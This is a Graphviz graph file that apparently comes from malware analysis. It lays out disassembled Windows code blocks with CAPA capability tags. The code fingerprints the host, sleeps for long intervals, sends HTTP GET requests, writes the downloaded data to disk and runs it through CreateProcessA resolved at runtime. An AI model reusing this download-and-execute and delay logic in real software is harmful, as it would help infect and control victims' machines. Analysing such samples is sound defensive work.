digraph "behavior-graph" {
	graph [bb="0,0,3711.5,6502"];
	node [label="\N",
		shape=box
	];
	0	[fillcolor=red,
		height=2.6389,
		label="sub_401000:\lpush    ecx\lpush    ecx\lpush    ebx\lpush    ebp\lpush    esi\lpush    edi\lxor     ecx, ecx\lmov     al, 1\l\l\lCAPA: \
encode data using XOR",
		pos="473,6129.5",
		style=filled,
		width=3.1944];
	1	[fillcolor=red,
		height=4.3194,
		label="movzx   edx, al\lmov     bl, al\lmov     byte_4094D8[ecx], al\lmov     byte_4093D8[edx], cl\lmov     dl, al\land     dl, 80h\lneg     \
dl\lsbb     dl, dl\land     edx, 1Bh\lshl     bl, 1\lxor     dl, bl\lxor     al, dl\linc     ecx\lcmp     ecx, 100h\ljb      short \
loc_40100A\l\l\lCAPA: encode data using XOR\l\lCAPA: encrypt data using RC4 KSA",
		pos="473,5549.5",
		style=filled,
		width=3.7083];
	0 -> 1	[pos="e,473,5705.4 473,6034 473,5948.1 473,5819.3 473,5716.3"];
	1 -> 1	[color=darkgreen,
		label=true,
		lp="640,5549.5",
		pos="e,606.96,5523.4 606.96,5575.6 617.79,5569.9 624.5,5561.2 624.5,5549.5 624.5,5541.4 621.33,5534.8 615.82,5529.6"];
	2	[height=0.73611,
		label="and     byte_4093D9, 0\lmov     al, 1\lmov     ecx, offset unk_4091B0\l",
		pos="473,5292",
		width=3.2639];
	1 -> 2	[color=red,
		label=false,
		lp="490,5367.5",
		pos="e,473,5319 473,5393.6 473,5369.9 473,5347.5 473,5329.8"];
	3	[height=2.6111,
		label="movzx   edx, al\lmov     [ecx], edx\lmov     dl, al\land     dl, 80h\lneg     dl\lsbb     dl, dl\ladd     ecx, 4\land     edx, 1Bh\lshl     \
al, 1\lxor     al, dl\lcmp     ecx, offset byte_4091D8\ljl      short loc_401044\l",
		pos="473,5080",
		width=3.3472];
	2 -> 3	[pos="e,473,5174.2 473,5265.2 473,5244.9 473,5214.9 473,5185.1"];
	3 -> 3	[color=darkgreen,
		label=true,
		lp="627,5080",
		pos="e,593.62,5058.6 593.62,5101.4 604.6,5096.9 611.5,5089.8 611.5,5080 611.5,5073.4 608.38,5068 603.01,5063.9"];
	4	[height=0.5,
		label="xor     edx, edx\l",
		pos="473,4434",
		width=1.6944];
	3 -> 4	[color=red,
		label=false,
		lp="490,4929.5",
		pos="e,473,4452.3 473,4985.7 473,4836.9 473,4553.5 473,4463.3"];
	5	[height=0.52778,
		label="test    edx, edx\ljz      short loc_40107C\l",
		pos="473,3826.5",
		width=2.5];
	4 -> 5	[pos="e,473,3845.9 473,4415.5 473,4331 473,3963.8 473,3856.8"];
	6	[height=1.1528,
		label="movzx   eax, byte_4093D8[edx]\lmov     ecx, offset unk_4095D7\lsub     ecx, eax\lmov     bl, [ecx]\ljmp     short loc_40107E\l",
		pos="286,3608.5",
		width=3.3333];
	5 -> 6	[color=red,
		label=false,
		lp="397,3714.5",
		pos="e,321.14,3650.1 457.06,3807.1 428.81,3774.5 369.11,3705.5 328.28,3658.3"];
	7	[height=0.5,
		label="xor     bl, bl\l",
		pos="473,3608.5",
		width=1.3611];
	5 -> 7	[color=darkgreen,
		label=true,
		lp="488.5,3714.5",
		pos="e,473,3627 473,3807.1 473,3769.3 473,3682.6 473,3637.7"];
	8	[height=5.9444,
		label="mov     al, bl\lmov     cl, bl\lshr     al, 7\lshl     cl, 1\lor      al, cl\lmov     cl, al\lxor     bl, al\lshr     cl, 7\lshl     \
al, 1\lor      cl, al\lmov     al, cl\lxor     bl, cl\lshr     al, 7\lshl     cl, 1\lor      al, cl\lmov     cl, al\lxor     bl, \
al\lshr     cl, 7\lshl     al, 1\lor      cl, al\lxor     cl, bl\lxor     cl, 63h\lmovzx   eax, cl\lmov     byte_4092D8[edx], cl\lmov     \
byte_4091D8[eax], dl\linc     edx\lcmp     edx, 100h\ljb      short loc_401066\l",
		pos="473,3277",
		width=3.0694];
	6 -> 8	[pos="e,362.1,3473.4 309.12,3566.8 321.84,3544.4 338.68,3514.7 356.73,3482.9"];
	7 -> 8	[pos="e,473,3491.4 473,3590.2 473,3571.4 473,3539 473,3502"];
	8 -> 5	[color=darkgreen,
		label=true,
		lp="555.5,3608.5",
		pos="e,483.56,3807.3 530.74,3491.4 540.59,3555.2 544,3625.2 531,3689 522.94,3728.6 502.96,3770.9 488.71,3797.8"];
	9	[height=0.5,
		label="xor     edi, edi\l",
		pos="473,2994",
		width=1.5972];
	8 -> 9	[color=red,
		label=false,
		lp="490,3037.5",
		pos="e,473,3012.3 473,3062.7 473,3047.6 473,3034 473,3023.1"];
	10	[height=3.4444,
		label="mov     bl, byte_4092D8[edi]\lmov     ecx, edi\lmovzx   esi, bl\lshl     ecx, 2\lmov     eax, esi\lrol     eax, 8\lmov     dword_\
4061B0[ecx], esi\lmov     dword_4065B0[ecx], eax\lmov     eax, esi\lrol     eax, 10h\lmov     dword_4069B0[ecx], eax\lmov     eax, \
esi\lrol     eax, 18h\ltest    bl, bl\lmov     dword_406DB0[ecx], eax\ljz      short loc_401123\l",
		pos="473,2815",
		width=3.4306];
	9 -> 10	[pos="e,473,2939.5 473,2975.7 473,2968.7 473,2960.1 473,2950.3"];
	11	[fillcolor=red,
		height=2.4306,
		label="movzx   eax, byte_4093D8[esi]\lmovzx   edx, byte_4093DA\ladd     eax, edx\lmov     ebp, 0FFh\lcdq\lidiv    ebp\lmovzx   ebp, byte_\
4094D8[edx]\ljmp     short loc_401125\l\l\lCAPA: encrypt data using RC4 KSA",
		pos="259,2552.5",
		style=filled,
		width=3.7083];
	10 -> 11	[color=red,
		label=false,
		lp="371,2665.5",
		pos="e,330.4,2640.4 371.64,2690.6 360.1,2676.6 348.47,2662.4 337.29,2648.8"];
	12	[height=0.5,
		label="xor     ebp, ebp\l",
		pos="473,2552.5",
		width=1.7222];
	10 -> 12	[color=darkgreen,
		label=true,
		lp="488.5,2665.5",
		pos="e,473,2570.9 473,2690.6 473,2649.8 473,2608.2 473,2581.6"];
	13	[height=0.52778,
		label="test    bl, bl\ljz      short loc_40114A\l",
		pos="311,2409",
		width=2.4861];
	11 -> 13	[pos="e,304.28,2428.3 290.9,2464.7 294.32,2455.4 297.61,2446.4 300.49,2438.6"];
	12 -> 13	[pos="e,347.01,2428.4 461.18,2534.1 447.98,2515.6 425.25,2486 401,2465 387.46,2453.3 371.14,2442.5 356.14,2433.7"];
	14	[fillcolor=red,
		height=2.4306,
		label="movzx   eax, byte_4093D8[esi]\lmovzx   edx, byte_4093DB\ladd     eax, edx\lmov     ebx, 0FFh\lcdq\lidiv    ebx\lmovzx   eax, byte_\
4094D8[edx]\ljmp     short loc_40114C\l\l\lCAPA: encrypt data using RC4 KSA",
		pos="196,2251.5",
		style=filled,
		width=3.7083];
	13 -> 14	[color=red,
		label=false,
		lp="301,2364.5",
		pos="e,260.09,2339.2 297.36,2389.6 289.2,2378.5 278.14,2363.6 266.33,2347.6"];
	15	[height=0.5,
		label="xor     eax, eax\l",
		pos="408,2251.5",
		width=1.6806];
	13 -> 15	[color=darkgreen,
		label=true,
		lp="358.5,2364.5",
		pos="e,397.1,2270 322.51,2389.6 339.61,2362.1 371.81,2310.5 391.44,2279"];
	16	[height=6.1528,
		label="shl     eax, 8\lor      eax, esi\lmov     bl, byte_4091D8[edi]\lshl     eax, 8\lor      eax, esi\lshl     eax, 8\lor      eax, ebp\lmov     \
edx, eax\lmov     dword_4081B0[ecx], eax\lrol     edx, 8\lmov     dword_4085B0[ecx], edx\lmov     edx, eax\lrol     edx, 10h\lmovzx   \
esi, bl\lrol     eax, 18h\lmov     dword_4089B0[ecx], edx\lmov     dword_408DB0[ecx], eax\lmov     eax, esi\lmov     dword_4051B0[\
ecx], esi\lrol     eax, 8\lmov     dword_4055B0[ecx], eax\lmov     eax, esi\lrol     eax, 10h\lmov     dword_4059B0[ecx], eax\lmov     \
eax, esi\lrol     eax, 18h\ltest    bl, bl\lmov     dword_405DB0[ecx], eax\ljz      short loc_4011D9\l",
		pos="252,1905.5",
		width=3.4306];
	14 -> 16	[pos="e,216.05,2127.3 210.13,2163.7 211.47,2155.5 212.86,2146.9 214.29,2138.1"];
	15 -> 16	[pos="e,352.12,2127.3 400.26,2233.4 391.19,2213.4 375.01,2177.8 356.59,2137.1"];
	17	[fillcolor=red,
		height=2.6389,
		label="movzx   eax, byte_4093D8[esi]\lmovzx   edx, byte_4093E6\ladd     eax, edx\lmov     ebp, 0FFh\lcdq\lidiv    ebp\lmovzx   eax, byte_\
4094D8[edx]\lmov     [esp+18h+var_4], eax\ljmp     short loc_4011DE\l\l\lCAPA: encrypt data using RC4 KSA",
		pos="159,1538",
		style=filled,
		width=3.7083];
	16 -> 17	[color=red,
		label=false,
		lp="207,1658.5",
		pos="e,183.03,1633.5 195.82,1683.7 192.35,1670.1 188.96,1656.7 185.72,1644"];
	18	[height=0.5,
		label="and     [esp+18h+var_4], 0\l",
		pos="415,1538",
		width=2.9028];
	16 -> 18	[color=darkgreen,
		label=true,
		lp="378.5,1658.5",
		pos="e,407.33,1556.2 350.46,1683.7 371.56,1636.4 391.08,1592.6 403,1565.9"];
	19	[height=0.52778,
		label="test    bl, bl\ljz      short loc_401207\l",
		pos="343,1387",
		width=2.4861];
	17 -> 19	[pos="e,320.3,1406.4 275.53,1442.6 288.79,1431.9 301.32,1421.8 311.9,1413.2"];
	18 -> 19	[pos="e,351.8,1406.2 406.6,1519.6 394.27,1494.1 371.14,1446.2 356.43,1415.8"];
	20	[fillcolor=red,
		height=2.6389,
		label="movzx   eax, byte_4093D8[esi]\lmovzx   edx, byte_4093E1\ladd     eax, edx\lmov     ebp, 0FFh\lcdq\lidiv    ebp\lmovzx   eax, byte_\
4094D8[edx]\lmov     [esp+18h+var_8], eax\ljmp     short loc_40120C\l\l\lCAPA: encrypt data using RC4 KSA",
		pos="170,1222",
		style=filled,
		width=3.7083];
	19 -> 20	[color=red,
		label=false,
		lp="319,1342.5",
		pos="e,270.23,1317.4 323.49,1367.6 311.58,1356.4 295.31,1341.1 277.8,1324.6"];
	21	[height=0.5,
		label="and     [esp+18h+var_8], 0\l",
		pos="426,1222",
		width=2.9028];
	19 -> 21	[color=darkgreen,
		label=true,
		lp="383.5,1342.5",
		pos="e,417.3,1240.1 352.36,1367.6 367.04,1338.8 395.53,1282.8 412.45,1249.6"];
	22	[fillcolor=red,
		height=1.1806,
		label="test    bl, bl\ljz      short loc_401231\l\l\lCAPA: encrypt data using RC4 KSA",
		pos="236,1047.5",
		style=filled,
		width=3.7083];
	20 -> 22	[pos="e,220.01,1090.3 206.09,1126.7 209.52,1117.7 212.9,1108.9 216.09,1100.5"];
	21 -> 22	[pos="e,281.88,1090.2 406.74,1203.5 379.49,1178.8 328.68,1132.6 289.54,1097.1"];
	23	[height=1.7778,
		label="movzx   eax, byte_4093D8[esi]\lmovzx   edx, byte_4093E5\ladd     eax, edx\lmov     ebp, 0FFh\lcdq\lidiv    ebp\lmovzx   ebp, byte_\
4094D8[edx]\ljmp     short loc_401233\l",
		pos="121,890",
		width=3.3611];
	22 -> 23	[color=red,
		label=false,
		lp="206,979.5",
		pos="e,167.93,954.45 205.18,1004.8 195.71,992.01 184.99,977.52 174.45,963.27"];
	24	[height=0.5,
		label="xor     ebp, ebp\l",
		pos="322,890",
		width=1.7222];
	22 -> 24	[color=darkgreen,
		label=true,
		lp="292.5,979.5",
		pos="e,312.53,908.12 259.05,1004.8 274.37,977.12 294.04,941.56 307.28,917.62"];
	25	[height=0.52778,
		label="test    bl, bl\ljz      short loc_401258\l",
		pos="310,770",
		width=2.4861];
	23 -> 25	[pos="e,280.41,789.47 222.69,825.51 240.04,814.68 257.06,804.05 271.4,795.1"];
	24 -> 25	[pos="e,311.86,789.26 320.23,871.59 318.32,852.81 315.25,822.59 312.97,800.17"];
	26	[fillcolor=red,
		height=2.8611,
		label="movzx   eax, byte_4093D8[esi]\lmovzx   edx, byte_4093E3\ladd     eax, edx\lmov     esi, 0FFh\lcdq\lidiv    esi\lmovzx   eax, byte_\
4094D8[edx]\ljmp     short loc_40125A\l\l\lCAPA: encrypt data using RC4 KSA\l\lCAPA: encrypt data using RC4 KSA",
		pos="262,597",
		style=filled,
		width=3.7083];
	25 -> 26	[color=red,
		label=false,
		lp="317,725.5",
		pos="e,290.76,700.46 304.86,750.7 301.93,740.24 297.97,726.15 293.65,710.75"];
	27	[height=0.5,
		label="xor     eax, eax\l",
		pos="474,597",
		width=1.6806];
	25 -> 27	[color=darkgreen,
		label=true,
		lp="398.5,725.5",
		pos="e,464.64,615.17 339.97,750.77 359.51,738.01 384.84,719.77 404,700 426.29,676.99 446.37,646.17 459.25,624.45"];
	28	[height=3.8611,
		label="shl     eax, 8\lor      eax, ebp\lshl     eax, 8\lor      eax, [esp+18h+var_8]\lshl     eax, 8\lor      eax, [esp+18h+var_4]\linc     \
edi\lmov     edx, eax\lmov     dword_4071B0[ecx], eax\lrol     edx, 8\lmov     dword_4075B0[ecx], edx\lmov     edx, eax\lrol     \
edx, 10h\lrol     eax, 18h\lmov     dword_4079B0[ecx], edx\lcmp     edi, 100h\lmov     dword_407DB0[ecx], eax\ljl      loc_4010C9\l",
		pos="474,318",
		width=3.4306];
	26 -> 28	[pos="e,368.17,457.28 340.34,493.64 347.29,484.56 354.42,475.25 361.58,465.89"];
	27 -> 28	[pos="e,474,457.49 474,578.67 474,555.69 474,512.85 474,468.49"];
	28 -> 10	[color=darkgreen,
		label=true,
		lp="578.5,1387",
		pos="e,534.15,2690.7 536.78,457.17 551.51,500.68 563,549.53 563,596 563,2553.5 563,2553.5 563,2553.5 563,2596.1 552.12,2640.5 537.93,\
2680.4"];
	29	[height=1.7778,
		label="pop     edi\lpop     esi\lpop     ebp\lmov     dword_4095D8, 1\lpop     ebx\lpop     ecx\lpop     ecx\lretn\l",
		pos="474,64",
		width=2.7083];
	28 -> 29	[color=red,
		label=false,
		lp="491,153.5",
		pos="e,474,128.24 474,178.84 474,165.18 474,151.72 474,139.1"];
	68	[height=0.52778,
		label="push    1B7740h\ljmp     short loc_4031D8\l",
		pos="768,6129.5",
		width=2.6528];
	70	[fillcolor=red,
		height=1.1806,
		label="call    esi ; Sleep\ljmp     short loc_403162\l\l\lCAPA: delay execution",
		pos="768,5549.5",
		style=filled,
		width=2.625];
	68 -> 70	[pos="e,764.28,5592.5 765.43,6110.2 760.42,6032.5 759.91,5727.1 763.91,5603.2"];
	70 -> 68	[pos="e,770.57,6110.2 771.72,5592.5 775.94,5703.8 775.75,6004.7 771.17,6099.5"];
	70 -> 70	[pos="e,862.79,5520.6 862.79,5578.4 873.54,5573 880.5,5563.4 880.5,5549.5 880.5,5540 877.21,5532.4 871.66,5526.9"];
	71	[height=1.1528,
		label="lea     eax, [ebp+var_100]\lpush    eax\lcall    sub_403243\lmov     [esp+108h+var_108], 927C0h\ljmp     short loc_4031D8\l",
		pos="768,5292",
		width=3.9722];
	70 -> 71	[pos="e,762.9,5333.7 762.85,5506.6 760.85,5462.2 760.73,5392.1 762.46,5344.4"];
	71 -> 70	[pos="e,773.15,5506.6 773.1,5333.7 775.12,5377.6 775.29,5447.7 773.59,5495.8"];
	73	[fillcolor=red,
		height=1.5972,
		label="lea     eax, [ebp+var_80]\lpush    80h ; '€'\lpush    eax\lcall    ds:gethostname\l\l\lCAPA: initialize Winsock library",
		pos="1111,6129.5",
		style=filled,
		width=3.3611];
	74	[fillcolor=red,
		height=3.6806,
		label="push    esi\lcall    ds:WSACleanup\llea     eax, [ebp+var_80]\lmov     esi, offset unk_410224\lpush    eax\lpush    esi\lcall    \
strcpy\lpush    offset aWindowsNt5521; \"+Windows+NT+5.521\"\lpush    esi\lcall    strcat\ladd     esp, 10h\lpop     esi\lleave\lretn\l\l\lCAPA: \
get hostname",
		pos="1111,5549.5",
		style=filled,
		width=5.9028];
	73 -> 74	[pos="e,1111,5682.2 1111,6071.8 1111,5984.7 1111,5815.2 1111,5693.2"];
	75	[fillcolor=red,
		height=10.347,
		label="sub_403243:\lpush    ebp\lmov     ebp, esp\lsub     esp, 60Ch\lpush    ebx\lpush    esi\lpush    edi\lpush    0Fh\lxor     ebx, \
ebx\lpop     ecx\lxor     eax, eax\llea     edi, [ebp+var_10B]\lmov     [ebp+var_10C], bl\lpush    0Fh\lrep stosd\lstosw\lstosb\lpop     \
ecx\lxor     eax, eax\llea     edi, [ebp+var_57]\lmov     [ebp+var_58], bl\lrep stosd\lstosw\lstosb\lmov     ecx, 0FFh\lxor     \
eax, eax\llea     edi, [ebp+var_60B]\lmov     [ebp+var_60C], bl\lrep stosd\lstosw\lstosb\llea     eax, [ebp+var_60C]\lmov     esi, \
ds:sscanf\lpush    eax\llea     eax, [ebp+var_58]\lpush    eax\llea     eax, [ebp+var_10C]\lmov     edi, offset aSSS; \"%s %s %s\"\lpush    \
eax\lpush    edi\lmov     [ebp+var_10], ebx\lpush    [ebp+arg_0]\lcall    esi ; sscanf\ladd     esp, 14h\lcmp     eax, 2\ljnz     \
loc_40356A\l\l\lCAPA: connect to HTTP server",
		pos="1851,6129.5",
		style=filled,
		width=3.8194];
	76	[fillcolor=red,
		height=1.1806,
		label="mov     esi, ds:InternetCloseHandle\lmov     edi, 927C0h\l\l\lCAPA: write file on Windows",
		pos="1476,5549.5",
		style=filled,
		width=3.7222];
	75 -> 76	[color=red,
		label=false,
		lp="1615,5731.5",
		pos="e,1503.1,5592.3 1713.2,5916.1 1639.4,5802.4 1554.6,5671.6 1509,5601.4"];
	96	[fillcolor=red,
		height=1.1806,
		label="mov     esi, ds:InternetCloseHandle\lmov     edi, 927C0h\l\l\lCAPA: link function at runtime on Windows",
		pos="2571,5549.5",
		style=filled,
		width=4.5];
	75 -> 96	[pos="e,2519,5592.3 1989,6017.7 2146.3,5891.4 2396.5,5690.6 2510.7,5598.9"];
	78	[height=0.73611,
		label="push    edi\lcall    ds:Sleep\ljmp     short loc_4032CC\l",
		pos="1586,5292",
		width=2.6667];
	76 -> 78	[pos="e,1574.8,5318.9 1494,5506.6 1515.3,5457.1 1550.4,5375.6 1570.5,5328.9"];
	81	[fillcolor=red,
		height=1.5972,
		label="push    [ebp+arg_0]\lcall    esi ; InternetCloseHandle\lpush    [ebp+var_8]\ljmp     short loc_403360\l\l\lCAPA: send HTTP request",
		pos="1321,5080",
		style=filled,
		width=3.3611];
	76 -> 81	[pos="e,1339.8,5137.7 1462.1,5506.6 1435.2,5425.4 1375.7,5246 1343.2,5148.1"];
	83	[fillcolor=red,
		height=1.5972,
		label="push    [ebp+var_4]\lcall    esi ; InternetCloseHandle\lpush    [ebp+var_8]\lcall    esi ; InternetCloseHandle\l\l\lCAPA: send HTTP \
request",
		pos="1637,5080",
		style=filled,
		width=3.3611];
	76 -> 83	[pos="e,1560.7,5137.9 1467.3,5506.6 1456.7,5445.8 1444.4,5330.4 1481,5242 1496.3,5205 1524.5,5171.8 1552.8,5145.2"];
	85	[fillcolor=red,
		height=1.1806,
		label="call    esi ; InternetCloseHandle\ljmp     loc_4032E2\l\l\lCAPA: create HTTP request",
		pos="1479,4434",
		style=filled,
		width=3.3611];
	76 -> 85	[pos="e,1445.8,4477 1438.5,5506.6 1364.1,5423.1 1203.9,5240.7 1191,5205 1153.3,5100.5 1163.2,5062.6 1191,4955 1239.6,4766.9 1372.4,4574.3 \
1439.4,4485.5"];
	88	[fillcolor=red,
		height=3.0556,
		label="lea     eax, [ebp+var_58]\lpush    2Fh ; '/'\lpush    eax\lcall    edi ; strrchr\linc     eax\lpush    eax\llea     eax, [ebp+var_\
20C]\lpush    eax\lcall    strcat\ladd     esp, 10h\ljmp     short loc_403450\l\l\lCAPA: get common file path",
		pos="1922,5080",
		style=filled,
		width=2.9861];
	76 -> 88	[pos="e,1840.9,5190.2 1526.6,5506.6 1574.9,5466 1648.9,5401.9 1709,5342 1758.7,5292.4 1769.5,5278.3 1814,5224 1820.7,5215.9 1827.4,5207.4 \
1834.2,5198.8"];
	93	[fillcolor=red,
		height=13.056,
		label="mov     eax, [ebp+var_10]\lpush    eax; unsigned int\lmov     dword_4095E0, eax\lcall    ??2@YAPAXI@Z; operator new(uint)\lpush    \
dword_4095E0\lmov     edi, eax\lpush    ebx\lpush    edi\lcall    memset\lpush    edi\lpush    [ebp+var_14]\lcall    sub_403803\lmov     \
eax, dword_4095E0\lpush    [ebp+var_C]\ladd     eax, 0FFFFFFF9h\lpush    eax\lpush    1\lpush    edi\lcall    ds:fwrite\lpush    \
edi; void *\lcall    ??3@YAXPAX@Z; operator delete(void *)\lpush    [ebp+var_C]\lcall    ds:fflush\lpush    [ebp+var_C]\lcall    \
ds:fclose\lpush    44h ; 'D'\llea     eax, [ebp+var_CC]\lpop     edi\lpush    edi\lpush    ebx\lpush    eax\lcall    memset\ladd     \
esp, 40h\lmov     [ebp+var_CC], edi\lmov     [ebp+var_9C], bx\lpush    2\lcall    ds:Sleep\lpush    offset aKernel32Dll_0; \"kernel32.dll\"\lcall    \
ds:LoadLibraryA\lpush    offset aCreateprocessa; \"CreateProcessA\"\lpush    eax\lcall    ds:GetProcAddress\llea     ecx, [ebp+var_\
68]\lpush    ecx\llea     ecx, [ebp+var_CC]\lpush    ecx\lpush    ebx\lpush    ebx\lpush    ebx\lpush    ebx\lpush    ebx\lpush    \
ebx\llea     ecx, [ebp+var_20C]\lpush    ebx\lpush    ecx\lcall    eax\lpush    [ebp+var_14]; void *\lcall    ??3@YAXPAX@Z; operator \
delete(void *)\lpop     ecx\l\l\lCAPA: create or open file",
		pos="2036,4434",
		style=filled,
		width=5.1111];
	76 -> 93	[pos="e,2136,4904.3 1610.4,5511.6 1750.6,5465.3 1963.7,5371 2064,5205 2116.1,5118.7 2135.2,5016.4 2136,4915.1"];
	94	[fillcolor=red,
		height=2.0139,
		label="push    [ebp+var_4]\lcall    esi ; InternetCloseHandle\lpush    [ebp+var_8]\lcall    esi ; InternetCloseHandle\lpush    [ebp+arg_\
0]\ljmp     loc_4037EF\l\l\lCAPA: link function at runtime on Windows",
		pos="1824,3826.5",
		style=filled,
		width=4.5];
	76 -> 94	[pos="e,1661.7,3840 1445.4,5506.5 1418.6,5472.3 1377,5424.6 1332,5393 1251.3,5336.4 1134,5391.6 1134,5293 1134,5293 1134,5293 1134,4433 \
1134,4203.7 1175.2,4113.5 1349,3964 1432.9,3891.9 1552.7,3857.8 1651.1,3841.7"];
	78 -> 78	[pos="e,1682.5,5281.2 1682.5,5302.8 1693.1,5300.8 1700,5297.2 1700,5292 1700,5288.8 1697.3,5286.2 1692.7,5284.2"];
	78 -> 81	[pos="e,1366.8,5138 1525.6,5265.1 1502.8,5254 1477.2,5240 1456,5224 1426.2,5201.6 1397.3,5172.3 1373.9,5146"];
	78 -> 83	[pos="e,1623.2,5137.8 1592.3,5265.2 1599.3,5236.3 1611,5188.1 1620.7,5148.3"];
	78 -> 85	[pos="e,1473.1,4476.7 1545.2,5265.3 1527,5249.8 1507.7,5228.6 1498,5205 1444.6,5074.9 1460,4639.2 1472.2,4487.5"];
	78 -> 88	[pos="e,1840.7,5190.2 1682.4,5273 1721.2,5262.8 1764.8,5247.2 1800,5224 1811.5,5216.4 1822.5,5207.4 1832.9,5197.7"];
	78 -> 93	[pos="e,2060.8,4904.3 1682.3,5286.6 1801.4,5279 1993.8,5258.5 2038,5205 2059.3,5179.2 2063.7,5055.7 2061,4914.9"];
	78 -> 94	[pos="e,1815.7,3899.3 1648.7,5265 1698.1,5243.9 1759.8,5216 1767,5205 1804.9,5147.3 1805.3,4032.8 1810,3964 1811.2,3946.6 1812.9,3927.9 \
1814.6,3910.2"];
	81 -> 85	[pos="e,1468.7,4476.9 1335,5022.1 1365.3,4898.5 1436.9,4606.6 1466.2,4487.2"];
	83 -> 85	[pos="e,1489.3,4476.9 1623,5022.1 1592.7,4898.5 1521.1,4606.6 1491.8,4487.2"];
	85 -> 78	[pos="e,1561,5265.3 1480.4,4476.7 1478.8,4617.2 1461.2,5071.7 1516,5205 1524.2,5224.9 1539.2,5243.1 1553.3,5257.6"];
	88 -> 93	[pos="e,1952.9,4904.5 1941.3,4969.8 1944.3,4952.9 1947.6,4934.6 1951,4915.3"];
	88 -> 94	[pos="e,1821.5,3899.2 1864.6,4969.8 1855.8,4948.5 1847.9,4926 1843,4904 1800.6,4715.2 1814.4,4127.9 1821.2,3910"];
	93 -> 94	[pos="e,1849.1,3899.3 1871.7,3963.8 1864.8,3944 1858.4,3925.7 1852.6,3909.3"];
	115	[height=0.52778,
		label="call    esi ; InternetCloseHandle\ljmp     short loc_4037FE\l",
		pos="2075,3277",
		width=3.3611];
	94 -> 115	[pos="e,2066.5,3296.5 1856.9,3753.6 1912.9,3631.6 2024.1,3389.1 2062,3306.4"];
	98	[fillcolor=red,
		height=1.3889,
		label="push    edi\lcall    ds:Sleep\ljmp     short loc_403599\l\l\lCAPA: create HTTP request",
		pos="2717,5292",
		style=filled,
		width=2.9583];
	96 -> 98	[pos="e,2688.8,5342.4 2594.9,5506.6 2619,5464.5 2656.3,5399.2 2683.4,5351.9"];
	100	[fillcolor=red,
		height=3.4722,
		label="push    ebx\lpush    4000000h\lpush    offset off_405010\lpush    ebx\llea     ecx, [ebp+var_58]\lpush    offset aHttp11; \"HTTP/\
1.1\"\lpush    ecx\lpush    offset aGet; \"GET\"\lpush    eax\lcall    ds:HttpOpenRequestA\lcmp     eax, ebx\lmov     [ebp+var_4], \
eax\ljnz     short loc_403611\l\l\lCAPA: connect to HTTP server",
		pos="2547,5080",
		style=filled,
		width=3.6528];
	96 -> 100	[pos="e,2553.4,5205.4 2568.8,5506.6 2565.5,5441.9 2559,5314.9 2553.9,5216.3"];
	105	[height=0.52778,
		label="call    esi ; InternetCloseHandle\ljmp     loc_4035AF\l",
		pos="2845,3826.5",
		width=3.3611];
	96 -> 105	[pos="e,2851.6,3845.9 2619.1,5506.5 2657.3,5474 2712.6,5428.7 2764,5393 2800.5,5367.7 2816,5370.6 2850,5342 2872,5323.5 2892,5321.7 2892,\
5293 2892,5293 2892,5293 2892,4433 2892,4209.7 2908.4,4151.6 2874,3931 2870,3905.2 2861.7,3876.7 2855,3856.2"];
	98 -> 98	[pos="e,2823.7,5281.4 2823.7,5302.6 2834.6,5300.5 2841.5,5297 2841.5,5292 2841.5,5288.9 2838.8,5286.4 2834.1,5284.4"];
	98 -> 100	[pos="e,2647.5,5205.1 2677.1,5241.8 2670,5233 2662.3,5223.4 2654.3,5213.5"];
	98 -> 105	[pos="e,2843.6,3845.7 2727.7,5241.6 2748.3,5168.8 2790.6,5027.7 2808,4904 2865.8,4491.9 2844.3,3982.7 2843.6,3856.7"];
	101	[fillcolor=red,
		height=1.5972,
		label="push    [ebp+arg_0]\lcall    esi ; InternetCloseHandle\lpush    [ebp+var_C]\ljmp     short loc_40362D\l\l\lCAPA: send HTTP request",
		pos="2687,4434",
		style=filled,
		width=3.3611];
	100 -> 101	[color=red,
		label=false,
		lp="2598,4929.5",
		pos="e,2674.6,4491.9 2574,4954.8 2603.3,4820 2649,4609.7 2672.3,4502.6"];
	100 -> 105	[pos="e,2746.9,3846 2540.8,4954.5 2528.1,4681 2504.9,4045.6 2557,3964 2596.5,3902.2 2672.4,3867.8 2736.3,3849"];
	107	[fillcolor=red,
		height=3.2639,
		label="lea     eax, [ebp+var_60C]\lpush    offset asc_40511C; \"\\\\\"\lpush    eax\lcall    strcat\lmov     edi, ds:strrchr\llea     eax, [\
ebp+var_58]\lpush    2Fh ; '/'\lpush    eax\lcall    edi ; strrchr\ladd     esp, 10h\ltest    eax, eax\ljz      short loc_4036C8\l\l\lCAPA: \
read data from Internet",
		pos="2393,4434",
		style=filled,
		width=3.2361];
	100 -> 107	[pos="e,2420.9,4551.7 2517.3,4954.8 2490.3,4841.9 2450.7,4676.1 2423.4,4562.2"];
	114	[fillcolor=red,
		height=2.2361,
		label="push    [ebp+var_4]\lcall    esi ; InternetCloseHandle\lpush    [ebp+var_C]\lcall    esi ; InternetCloseHandle\lpush    [ebp+arg_\
0]\l\l\lCAPA: write file on Windows\l\lCAPA: link function at runtime on Windows",
		pos="2287,3608.5",
		style=filled,
		width=4.5];
	100 -> 114	[pos="e,2272.8,3689.3 2415.2,5030.9 2359,5003 2299,4961.8 2267,4904 2204.3,4790.9 2257.2,3869 2267,3740 2268,3727 2269.5,3713.4 2271.3,\
3700"];
	101 -> 105	[pos="e,2840.2,3845.9 2701.9,4376 2734.8,4249.9 2812.9,3950.6 2837.5,3856.4"];
	105 -> 98	[pos="e,2739.5,5241.6 2848.6,3845.7 2860.8,3949.7 2885.7,4478.6 2826,4904 2809.4,5022.1 2770,5156.1 2743.2,5231.4"];
	108	[height=2.4028,
		label="lea     eax, [ebp+var_58]\lpush    2Fh ; '/'\lpush    eax\lcall    edi ; strrchr\linc     eax\lpush    eax\llea     eax, [ebp+var_\
60C]\lpush    eax\lcall    strcat\ladd     esp, 10h\ljmp     short loc_4036DA\l",
		pos="2377,3826.5",
		width=2.7917];
	107 -> 108	[color=red,
		label=false,
		lp="2398,3938.5",
		pos="e,2379.3,3913.1 2389.9,4316.3 2386.9,4202.1 2382.4,4030.4 2379.5,3923.9"];
	107 -> 114	[pos="e,2444.3,3689.2 2425.3,4316.1 2469.6,4145.2 2538.4,3837 2486,3740 2477.3,3723.9 2465.7,3709.5 2452.3,3696.6"];
	108 -> 114	[pos="e,2320.2,3689.2 2341.2,3739.5 2335.7,3726.3 2330,3712.6 2324.4,3699.3"];
	114 -> 115	[pos="e,2086.8,3296.4 2235.7,3527.7 2189.4,3455.8 2123.9,3354 2092.7,3305.6"];
	158	[height=0.73611,
		label="push    927C0h\lcall    ds:Sleep\ljmp     short loc_403B5B\l",
		pos="3052,6129.5",
		width=2.6667];
